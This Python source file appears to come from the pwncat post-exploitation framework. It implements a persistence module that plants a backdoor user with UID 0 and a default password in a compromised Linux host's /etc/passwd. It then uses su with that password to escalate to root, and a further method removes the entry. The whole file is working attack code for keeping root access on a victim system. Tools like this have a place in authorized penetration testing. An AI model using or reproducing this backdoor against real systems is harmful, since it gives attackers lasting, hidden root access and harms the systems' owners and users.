#!/usr/bin/env python3
import crypt

import pwncat
from pwncat.modules import Argument
from pwncat.modules.persist import PersistType, PersistModule, PersistError


class Module(PersistModule):
    """
    Install a backdoor user (w/ UID=0) in `/etc/passwd` with our backdoor
    password. This allows reconnection if SSH allows password auth
    and privilege escalation locally with `su`.
    """

    TYPE = PersistType.LOCAL
    ARGUMENTS = {
        **PersistModule.ARGUMENTS,
        "backdoor_user": Argument(
            str, default="pwncat", help="The name of the new user to add"
        ),
        "backdoor_pass": Argument(
            str, default="pwncat", help="The password for the new user"
        ),
        "shell": Argument(
            str, default="current", help="The shell to assign for the user"
        ),
    }
    PLATFORM = pwncat.platform.Platform.LINUX

    def install(self, user, backdoor_user, backdoor_pass, shell):
        """ Install this module """

        # Hash the password
        hashed = crypt.crypt(backdoor_pass)

        if shell == "current":
            shell = pwncat.victim.shell

        try:
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        passwd.append(f"{backdoor_user}:{hashed}:0:0::/root:{shell}\n")
        passwd_content = "".join(passwd)

        try:
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        # Reload the user database
        pwncat.victim.reload_users()

    def remove(self, user, backdoor_user, backdoor_pass, shell):
        """ Remove this module """

        if user != "root":
            raise PersistError("only root persistence is possible")

        # Hash the password
        hashed = crypt.crypt(backdoor_pass)

        if shell == "current":
            shell = pwncat.victim.shell

        try:
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        for i in range(len(passwd)):
            entry = passwd[i].split(":")
            if entry[0] == backdoor_user:
                passwd.pop(i)
                break
        else:
            return

        passwd_content = "".join(passwd)

        try:
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        # Reload the user database
        pwncat.victim.reload_users()

    def escalate(self, user, backdoor_user, backdoor_pass, shell):
        """ Utilize this module to escalate """

        pwncat.victim.run(f"su {backdoor_user}", wait=False)
        pwncat.victim.recvuntil(": ")
        pwncat.victim.client.send(backdoor_pass.encode("utf-8") + b"\n")
        pwncat.victim.update_user()
